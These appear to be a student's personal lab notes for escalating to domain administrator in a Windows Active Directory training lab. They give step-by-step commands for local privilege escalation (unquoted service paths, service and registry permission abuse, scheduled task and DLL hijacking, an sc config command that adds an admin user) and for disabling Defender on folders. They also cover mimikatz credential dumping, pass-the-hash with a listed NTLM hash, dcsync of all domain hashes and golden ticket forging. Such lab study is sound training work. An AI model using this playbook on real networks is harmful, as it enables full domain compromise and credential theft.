STEPS 4 DOMAD
Run angry IP scanner (or dl it and then run it) to find IP's of other machines
Download sysinternals
Get a user added to admin (priv escalation)

1) remote mouse
> click on green icon bottom right
> settings
> under image transfer folder click "Change..."
> click OK if prompted with error
> go to C:\Windows\System32 and type "cmd"
> right click cmd -> open (opens system cmd)
> [add user command]

2) unquoted service path
> open services
> sort by description, so services without a description appear on top
> check if "path to executable:" has spaces and no quotes
> example -> C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
> look for writable directory, for example C:\Program Files\Unquoted Path Service
> services always expect an executable (.exe)
> create folder on desktop
> create batch file (.bat) with "[add user command]"
> place batch file inside folder
> use bat2exe on that folder (run bat2exe from cmd)
> rename to common.exe (for this example ofc)
> place exe in C:\Program Files\Unquoted Path Service
> run service
> net user in cmd to check if user is added
> if not, restart machine, run service and check again
> if you have executable rights, maybe run exe from cmd, who knows

3) weak file permission services
> example from lab: C:\Program Files\File Permissions Service\filepermservice.exe
> "filepermservice.exe" can be renamed
> check steps above to make own exe
> place exe inside C:\Program Files\File Permissions Service
> rename old .exe to whatever
> name your own exe to "filepermservice.exe"
> start service
> net user in cmd to check if user is added

4) weak registry permissions (regsvc)
> open registry editor
> go to \HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc
> right click on imagepath -> select modify
> edit the value data so it points to an exe you control, or
> with bat2exe you can make a .exe that that adds an administrative user (see the notes above)
> open services
> look for the service that has the modified image path as the "path to executable"
> run the service

5) scheduled task
> "C:\Windows\Tasks Migrated" may contain tasks you can exploit / configure
> example from lab: pinger
> "C:\Windows\Tasks Migrated" contained the task "pinger"
> open task scheduler
> the "tasks migrated" folder shouldn't be in the folder tree
> go to action -> import task
> select "all files" on bottom right
> navigate to "C:\Windows\Tasks Migrated"
> open "pinger" or whatever task looks weak (only one word for example)
> go to triggers and see what triggers it
> go to action to see what it does and what file it triggers (.bat for example)
> check if the file is renamable and if the directory is writable
> rename the file to whatever
> place your own file (add administrative user through a batch file)

> open task in notepad (easier method than opening in task scheduler)

6) DACL service
> go to services
> check if there is a dacl service (daclsvc)
> open cmd
> go to where you stored your sysinternals
> accesschk -uwvc "normaluser" *
> it might say "RW daclsvc" (should mean you have read/write rights for the service actions listed)
> sc config daclsvc binpath="cmd /c cmd.exe /c net user Helpdesk L3tm3!n /add && net localgroup administrators Helpdesk /add"
> run the service
> might have to do the sc command multiple times and run the service again

7) dll hijack
> last resort for privilege escalation
> go to services
> there may be a service that indicates a dll hijack
> go to the properties of the service to see the path and name of the .exe it calls
> copy the .exe to your own machine (drag n drop or shared folder)
> open cmd on own machine
> sc create ServiceName binPath= "C:\temp\name.exe" (insert name of .exe)
> run service you made
> open procmon (from sysinternals) on own machine
> click on filter icon (ctrl+L) and add the following 2 filters:
> [result] [is] [NAME NOT FOUND] -> click add
> [path] [ends with] [.dll] -> click add
> click ok
> click on process name to sort
> if the .exe and its dll have multiple entries (like 5+), the %path% variable might be used
> note down the name of the dll
> go back to the VM and open cmd
> echo %path%
> look if there is a writable directory listed (like C:\temp)
> go back to own machine
> download Mike's dll + C code from OneDrive if not done yet
> note down the the fake admin credentials after opening his C code in notepad
> rename dll to the name you noted down earlier
> copy dll to the VM
> place dll inside the directory you found in %path%
> run service
> net user in cmd to check if it worked


Exclude C: disk on defender, needs .\name to do local machine instead of ADLAB domain
Download mimikatz
Run as admin 

Privilege::debug
Sekurlsa::logonpasswords 
> Find admin ntlm hash
sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:af992895db0f2c42a1bc96546e92804a ((pass the hash))
> With the CMD opened, test if ur running as admin ( run 'dir \\192.168.56.30\c$')
Run 'net group "domain admins" /domain' to find members of domads
> Use psloggedon from the systinternalssuite to see who is currently logged on to the local machine
> run 'psloggedon \\win10adm'
Run 'PsExec -r ExecPs \\ip cmd' to open cmd on the admin machine
Download sysinternals on admin machine
> run 'curl -L -o SysinternalsSuite.zip https://download.sysinternals.com/files/SysinternalsSuite.zip'
> run 'tar -xf SysinternalsSuite.zip'
Disable windefender on downloads folder
> Run ' powershell -Command "Start-Process powershell -Argumentlist 'Add-MpPreference -ExclusionPath "C:\Users\Administrator\Downloads"' '
>> option: type 'Powershell', then set-mppreference -exclusionpath C:\temp


Mount drive:
> Net use x: \\192.168.56.30\c$ ((from client machine))
> then go to x: (type x: in cmd), which will put us in the x drive on our own machine, which allows us to cd into the folders on there, allowing us to copy mimikatz to the folder we made and excluded. 
> Go to the excluded folder (x:\Users\Administrator\Downloads on the client machine and then run (( copy c:\Users\Normaluser\Downloads\Mimikatz_trunk\x64\*.* . ))

RACE CONDITION:
> We need to open mimikatz before windows defender can catch it in transit, defender cant delete an open file handle. So we need to be quick to open mimikatz.exe once we copy it over. I did this by going to x: , cd'ing to Users\Administrator\Downloads and having mimikatz.exe ready to run.

Get domad hash:
> Repeat commands to get hashes (from the mimikatz window from the admin machine)
go back to my client pc and run the sekurlsa::pth command with user domad on domain win10client ((sekurlsa::pth /user:domad /domain:WIN10CLIENT /ntlm:hash))
which does work and opens me a CMD. I can run dir \\192.168.56.10\c$ to test
> Run mimimatz from this window
Dump hashes:
" lsadump::dcsync /domain:adlab.local /all /csv "  ((from the new window 'as domad'))


Golden ticket:
> Get Kerberos hash, and get sid from local cmd whoami /user (remove the last 4 digits and -)
> In your local mimikatz, Kerberos::golden /domain:adlab.local /sid:sid /rc4:ntlm /user:name /id:500 /ptt
> Misc::cmd
 

